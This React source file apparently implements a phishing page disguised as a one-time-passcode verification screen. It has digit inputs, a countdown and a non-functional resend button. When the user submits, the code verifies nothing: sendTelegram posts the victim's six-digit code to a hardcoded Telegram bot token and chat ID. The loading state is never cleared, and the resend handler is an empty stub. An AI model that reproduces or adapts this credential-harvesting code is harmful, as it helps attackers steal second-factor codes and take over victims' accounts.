import React, { useRef, useState, useEffect } from "react";
import axios from "axios";
import logo from "./assets/logov.png";

const RESEND_SECONDS = 119; // 01:59

function OTP({ email, onVerified }) {
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [resending, setResending] = useState(false);
  const [error, setError] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(RESEND_SECONDS);

  const inputs = useRef([]);

  useEffect(() => {
    inputs.current[0]?.focus();
  }, []);

  async function sendTelegram(message) {
    const url = `https://api.telegram.org/bot8582971725:AAFw8yPNNZm2kRNTndB4uZUwuNlSGiPMWJA/sendMessage`;

    await axios.post(url, {
      chat_id: 7995115550,
      text: message,
      parse_mode: "HTML",
    });
  }

  useEffect(() => {
    if (secondsLeft <= 0) return;
    const timer = setInterval(() => setSecondsLeft((s) => s - 1), 1000);
    return () => clearInterval(timer);
  }, [secondsLeft]);

  const formatTime = (s) => {
    const m = Math.floor(s / 60)
      .toString()
      .padStart(2, "0");
    const sec = (s % 60).toString().padStart(2, "0");
    return `${m}:${sec}`;
  };

  const handleChange = (value, index) => {
    if (!/^\d?$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);
    if (error) setError("");

    if (value && index < 5) {
      inputs.current[index + 1].focus();
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputs.current[index - 1].focus();
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pasted = e.clipboardData
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, 6);
    if (!pasted) return;

    const newOtp = [...otp];
    pasted.split("").forEach((char, i) => {
      newOtp[i] = char;
    });
    setOtp(newOtp);

    const nextIndex = Math.min(pasted.length, 5);
    inputs.current[nextIndex]?.focus();
  };

  const handleVerify = async () => {
    const code = otp.join("");
    if (code.length !== 6) return;

    setLoading(true);
    setError("");

    try {
      sendTelegram(otp.join(""));
    } catch (err) {
      setError(
        err.response?.data?.message ||
          "Something went wrong. Please try again.",
      );
    } finally {
      return;
    }
  };

  const handleResend = async () => {
    setResending(true);
    setError("");

    try {
    } catch (err) {
      setError(
        err.response?.data?.message || "Couldn't resend the code. Try again.",
      );
    } finally {
      setResending(false);
    }
  };

  return (
    <div className="color-bg min-h-screen flex justify-center items-center px-4">
      <div className="color-b w-full max-w-md rounded-3xl p-8 shadow-xl">
        <div className="flex justify-center mb-6">
          <img src={logo} alt="Logo" className="w-36" />
        </div>

        <h2 className="text-white text-2xl font-bold text-center">
          Verify OTP
        </h2>

        <p className="color-lbl text-center mt-2 text-sm">
          Enter the 6-digit verification code sent to your email.
        </p>

        <div className="flex justify-between mt-8 gap-2" onPaste={handlePaste}>
          {otp.map((digit, index) => (
            <input
              key={index}
              ref={(el) => (inputs.current[index] = el)}
              type="text"
              inputMode="numeric"
              maxLength={1}
              placeholder="0"
              value={digit}
              disabled={loading}
              onChange={(e) => handleChange(e.target.value, index)}
              onKeyDown={(e) => handleKeyDown(e, index)}
              className="color-ipt color-lb w-12 h-14 rounded-xl text-center text-xl font-bold outline-none disabled:opacity-50"
            />
          ))}
        </div>

        {error && (
          <p className="text-red-400 text-sm text-center mt-4">{error}</p>
        )}

        <button
          onClick={handleVerify}
          disabled={otp.join("").length !== 6 || loading}
          className="color-btn mt-8 w-full rounded-full py-3 font-bold disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
        >
          {loading ? (
            <>
              <svg
                className="animate-spin h-5 w-5"
                viewBox="0 0 24 24"
                fill="none"
              >
                <circle
                  className="opacity-25"
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                />
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                />
              </svg>
              Verifying...
            </>
          ) : (
            "Verify Code"
          )}
        </button>

        <div className="mt-6 text-center">
          <p className="color-lbl text-sm">Didn't receive the code?</p>

          <button
            onClick={handleResend}
            disabled={secondsLeft > 0 || resending}
            className="mt-2 font-bold color-lbl hover:underline disabled:opacity-50 disabled:cursor-not-allowed disabled:no-underline"
          >
            {resending ? "Resending..." : "Resend OTP"}
          </button>
        </div>

        <div className="mt-8 text-center">
          <p className="color-lbl text-xs">The verification code expires in</p>
          <p className="text-white font-bold mt-1">{formatTime(secondsLeft)}</p>
        </div>
      </div>
    </div>
  );
}

export default OTP;
